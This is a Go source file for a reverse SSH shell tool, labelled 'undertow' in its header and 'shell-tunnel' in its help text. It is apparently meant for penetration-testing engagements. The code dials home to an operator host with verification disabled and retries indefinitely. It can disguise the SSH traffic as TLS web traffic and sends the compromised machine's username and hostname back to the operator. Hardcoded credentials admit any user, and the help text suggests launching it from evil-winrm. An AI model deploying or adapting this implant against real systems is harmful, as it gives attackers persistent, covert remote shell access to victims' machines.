// undertow - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"os/user"
	"path"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type params struct {
	LUSER        string
	LHOST        string
	LPORT        uint
	homeBindPort uint
	listen       bool
	shell        string
	noShell      bool
	verbose      bool
	tlsWrap      bool
	tlsSNI       string
}

const detachEnvKey = "_SHELL_TUNNEL_DETACHED"

// dialRetryDelay is how long a dial-home attempt waits before trying again.
const dialRetryDelay = 5 * time.Second

func shouldDetach() bool {
	if os.Getenv(detachEnvKey) == "1" {
		return false
	}
	for _, arg := range os.Args[1:] {
		if arg == "-d" {
			return true
		}
	}
	return DAEMONIZE != ""
}

func removeDFlag(args []string) []string {
	result := make([]string, 0, len(args))
	for _, a := range args {
		if a != "-d" {
			result = append(result, a)
		}
	}
	return result
}

func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
	return func(ctx ssh.Context, dhost string, dport uint32) bool {
		if forbidden {
			outWarnf("Denying local port forwarding request %s:%d", dhost, dport)
			return false
		}
		outInfof("Accepted forward to %s:%d", dhost, dport)
		return true
	}
}

func createReversePortForwardingCallback() ssh.ReversePortForwardingCallback {
	return func(ctx ssh.Context, host string, port uint32) bool {
		outInfof("Attempt to bind at %s:%d granted", host, port)
		return true
	}
}

func createSessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
	return func(sess ssh.Session, requestType string) bool {
		if forbidden {
			outWarnf("Denying shell/exec/subsystem request")
			return false
		}
		return true
	}
}

func createPasswordHandler(localPassword string) ssh.PasswordHandler {
	return func(ctx ssh.Context, pass string) bool {
		passed := subtle.ConstantTimeCompare([]byte(pass), []byte(localPassword)) == 1
		if passed {
			outOkf("Successful authentication with password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		} else {
			outWarnf("Invalid password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		}
		return passed
	}
}

func createPublicKeyHandler(authorizedKey string) ssh.PublicKeyHandler {
	if authorizedKey == "" {
		return nil
	}

	return func(ctx ssh.Context, key ssh.PublicKey) bool {
		master, _, _, _, err := ssh.ParseAuthorizedKey([]byte(authorizedKey))
		if err != nil {
			outWarnf("Encountered error while parsing public key: %v", err)
			return false
		}
		passed := bytes.Equal(key.Marshal(), master.Marshal())
		if passed {
			outOkf("Successful authentication with ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		} else {
			outWarnf("Invalid ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
		}
		return passed
	}
}

func createSFTPHandler() ssh.SubsystemHandler {
	return func(s ssh.Session) {
		server, err := sftp.NewServer(s)
		if err != nil {
			outWarnf("Sftp server init error: %v", err)
			return
		}
		defer server.Close()

		outInfof("New sftp connection from %s", s.RemoteAddr().String())
		if err := server.Serve(); err == io.EOF {
			outInfof("Sftp connection closed by client")
		} else if err != nil {
			outWarnf("Sftp server exited with error: %v", err)
		}
	}
}

func generateSelfSignedCert(sni string) (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{sni},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return tls.X509KeyPair(certPEM, keyPEM)
}

func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool, tlsWrap bool, tlsSNI string) (net.Listener, error) {
	var (
		err    error
		client *gossh.Client
	)

	config := &gossh.ClientConfig{
		User: username,
		Auth: []gossh.AuthMethod{
			gossh.Password(localPassword),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect with localPassword initially and keep asking for
	// password on failure. A dial-home payload must outlive the listener
	// being late and VPN blips, so a failed attempt is retried every
	// dialRetryDelay instead of killing the process; only a password we
	// cannot ask for ends the loop.
	for {
		if tlsWrap {
			// TLS-wrapped connection: TCP -> TLS -> SSH
			tcpConn, dialErr := net.Dial("tcp", address)
			if dialErr != nil {
				err = dialErr
			} else {
				tlsConfig := &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         tlsSNI,
					NextProtos:         []string{"h2", "http/1.1"},
				}
				tlsConn := tls.Client(tcpConn, tlsConfig)
				sshConn, chans, reqs, dialErr := gossh.NewClientConn(tlsConn, address, config)
				if dialErr == nil {
					client = gossh.NewClient(sshConn, chans, reqs)
					break
				}
				tlsConn.Close()
				err = dialErr
			}
		} else {
			client, err = gossh.Dial("tcp", address, config)
			if err == nil {
				break
			}
		}

		if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
			fmt.Println("Enter password:")
			data, readErr := term.ReadPassword(int(syscall.Stdin))
			if readErr != nil {
				// No terminal to ask on: retrying would spin forever
				// redialling, so give the error back instead.
				return nil, readErr
			}

			config.Auth = []gossh.AuthMethod{
				gossh.Password(string(data)),
			}
			continue
		}

		outWarnf("Dialling home to %s failed: %v; retrying in %s", address, err, dialRetryDelay)
		time.Sleep(dialRetryDelay)
	}

	bindAddr := fmt.Sprintf("127.0.0.1:%d", homeBindPort)
	if homeBindPort == 0 {
		outInfof("Requesting random port allocation from SSH server...")
	}
	ln, err := client.Listen("tcp", bindAddr)
	if err != nil {
		return nil, err
	}

	actualAddr := ln.Addr().String()
	outOkf("listening at home on %s", actualAddr)

	// Keep NAT and stateful firewalls from eating an idle callback. The
	// goroutine ends by itself once the connection is gone.
	go func() {
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if _, _, err := client.SendRequest("keepalive@openssh.com", true, nil); err != nil {
				return
			}
		}
	}()

	// Verify port allocation worked (defensive check)
	if homeBindPort == 0 && strings.HasSuffix(actualAddr, ":0") {
		outWarnf("SSH server returned port 0 - random port allocation may not be supported")
	}

	// Attempt to send extra info back home in the info message of an extra ssh channel
	sendExtraInfo(client, ln.Addr().String())

	return ln, nil
}

type ExtraInfo struct {
	CurrentUser      string
	Hostname         string
	ListeningAddress string
}

func sendExtraInfo(client *gossh.Client, listeningAddress string) {

	extraInfo := ExtraInfo{ListeningAddress: listeningAddress}

	if usr, err := user.Current(); err != nil {
		extraInfo.CurrentUser = "ERROR"
	} else {
		extraInfo.CurrentUser = usr.Username
	}
	if hostname, err := os.Hostname(); err != nil {
		extraInfo.Hostname = "ERROR"
	} else {
		extraInfo.Hostname = hostname
	}

	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&extraInfo))
	// The receiving end is expected to reject the channel, so "th4nkz" is a sign of success and we ignore it
	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
		outWarnf("Could not create info channel: %+v", err)
	}
	// If the channel is actually accepted, just close it again
	if err == nil {
		go gossh.DiscardRequests(newReq)
		newChan.Close()
	}
}

// sessionCounter numbers callbacks in the order they land, so several
// targets calling the same listener stay tellable apart.
var sessionCounter atomic.Uint64

func createExtraInfoHandler() ssh.ChannelHandler {
	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
		var extraInfo ExtraInfo
		err := gossh.Unmarshal(newChan.ExtraData(), &extraInfo)
		newChan.Reject(gossh.Prohibited, "th4nkz")
		if err != nil {
			outWarnf("Could not parse extra info from %s", conn.RemoteAddr())
			return
		}
		id := sessionCounter.Add(1)
		outOkf(
			"Session %d: %s on %s (from %s), reachable via %s",
			id,
			extraInfo.CurrentUser,
			extraInfo.Hostname,
			conn.RemoteAddr(),
			extraInfo.ListeningAddress,
		)
		printConnectLines(extraInfo.ListeningAddress)
	}
}

// printConnectLines gives the operator two paste-ready commands when a
// callback lands: one starts a ControlMaster with the engagement's ssh
// hygiene flags, the next opens the interactive session over that socket.
// Forwards and sftp then share the one authenticated connection, and the
// per-run host key never touches ~/.ssh/known_hosts.
func printConnectLines(listeningAddress string) {
	host, port, err := net.SplitHostPort(listeningAddress)
	if err != nil {
		return
	}
	sock := fmt.Sprintf("/tmp/shell-tunnel-%s.sock", port)
	outCommandf("ssh -fNM -S %s -p %s %s@%s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes", sock, port, LUSER, host)
	outCommandf("ssh -S %s -p %s %s@%s", sock, port, LUSER, host)
}

func setupParameters(noCLI string, tlsWrapVar string, tlsSNIVar string) *params {
	if noCLI != "" {
		return setupParametersWithoutCLI(tlsWrapVar, tlsSNIVar)
	}

	var help = fmt.Sprintf(`shell-tunnel v%[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: %[1]s [options] [[<user>@]<target>]

Examples:
  Bind:
	%[1]s -l
	%[1]s -v -l -p 4444
  Reverse:
	%[1]s 192.168.0.1
	%[1]s kali@192.168.0.1
	%[1]s -p 31337 192.168.0.1
	%[1]s -v -b 0 kali@192.168.0.2

Options:
	-l, Start shell-tunnel in listening mode (overrides reverse scenario)
	-p, Port at which shell-tunnel is listening for incoming ssh connections (bind scenario)
		or where it tries to establish a ssh connection (reverse scenario) (default: %[6]s)
	-b, Reverse scenario only: bind to this port after dialling home (default: %[7]s)
	-s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: %[5]s)
		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
	-d, Detach and run in the background (useful for launching from evil-winrm or
		other sessions where you don't want to hold the window open)
	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
		(if only remote port forwarding is needed, e.g. when catching reverse connections)
	-v, Emit status output ([ok]/[!]/[x]/[i] lines; respects NO_COLOR)
	-V, --version, Print the version and exit

<target>
	Optional target which enables the reverse scenario. Can be prepended with
	<user>@ to authenticate as a different user other than '%[8]s' while dialling home

Credentials:
	Accepting all incoming connections from any user with either of the following:
	 * Password "%[3]s"
	 * PubKey   "%[4]s"
`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)

	// Print only: flag.ExitOnError exits 0 for -h and 2 for a parse error
	// (0 ok, 1 runtime, 2 usage), so Usage itself must never exit.
	flag.Usage = func() {
		fmt.Print(help)
	}

	p := params{}

	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		outFatalf("Cannot convert LPORT: %v", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		outFatalf("Cannot convert BPORT: %v", err)
	}
	flag.UintVar(&p.LPORT, "p", uint(lport), "")
	flag.UintVar(&p.homeBindPort, "b", uint(homeBindPort), "")
	flag.BoolVar(&p.listen, "l", false, "")
	flag.StringVar(&p.shell, "s", defaultShell, "")
	flag.BoolVar(&p.noShell, "N", false, "")
	flag.BoolVar(&p.verbose, "v", false, "")
	showVersion := flag.Bool("V", false, "")
	flag.BoolVar(showVersion, "version", false, "")
	flag.Parse()

	if *showVersion {
		fmt.Printf("shell-tunnel v%s\n", version)
		os.Exit(0)
	}

	if p.LPORT > 65535 {
		outFatalf("Port (-p) must be between 1 and 65535")
	}
	if p.homeBindPort > 65535 {
		outFatalf("Bind port (-b) must be between 1 and 65535")
	}

	outInit(p.verbose, false)

	switch len(flag.Args()) {
	case 0:
		p.LUSER = LUSER
		p.LHOST = LHOST
	case 1:
		target := strings.Split(flag.Args()[0], "@")
		switch len(target) {
		case 1:
			p.LUSER = LUSER
			p.LHOST = target[0]
		case 2:
			p.LUSER = target[0]
			p.LHOST = target[1]
		default:
			outFatalf("Could not parse '%s'", target)
		}

	default:
		outFailf("Invalid arguments, check usage")
		os.Exit(2)
	}

	p.tlsWrap = tlsWrapVar != ""
	p.tlsSNI = tlsSNIVar

	return &p
}

func setupParametersWithoutCLI(tlsWrapVar string, tlsSNIVar string) *params {
	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		outFatalf("Cannot convert LPORT: %v", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		outFatalf("Cannot convert BPORT: %v", err)
	}

	outInit(false, true)

	return &params{
		LUSER:        LUSER,
		LHOST:        LHOST,
		LPORT:        uint(lport),
		homeBindPort: uint(homeBindPort),
		listen:       false,
		shell:        defaultShell,
		noShell:      false,
		verbose:      false,
		tlsWrap:      tlsWrapVar != "",
		tlsSNI:       tlsSNIVar,
	}
}

func run(p *params, server *ssh.Server) {
	var (
		ln  net.Listener
		err error
	)

	if p.listen || p.LHOST == "" {
		outInfof("Starting ssh server on :%d", p.LPORT)
		ln, err = net.Listen("tcp", fmt.Sprintf(":%d", p.LPORT))
		if err == nil {
			if p.tlsWrap {
				cert, tlsErr := generateSelfSignedCert(p.tlsSNI)
				if tlsErr != nil {
					outFatalf("Failed to generate TLS certificate: %v", tlsErr)
				}
				tlsConfig := &tls.Config{
					Certificates: []tls.Certificate{cert},
					NextProtos:   []string{"h2", "http/1.1"},
				}
				ln = tls.NewListener(ln, tlsConfig)
				outOkf("TLS listening on %s", ln.Addr().String())
			} else {
				outOkf("listening on %s", ln.Addr().String())
			}
		}
	} else {
		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
		if p.tlsWrap {
			outInfof("Dialling home via TLS+SSH to %s (SNI: %s)", target, p.tlsSNI)
		} else {
			outInfof("Dialling home via ssh to %s", target)
		}
		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose, p.tlsWrap, p.tlsSNI)
	}

	if err != nil {
		outFatalf("%v", err)
	}
	defer ln.Close()
	if serveErr := server.Serve(ln); serveErr != nil {
		outFatalf("%v", serveErr)
	}
}
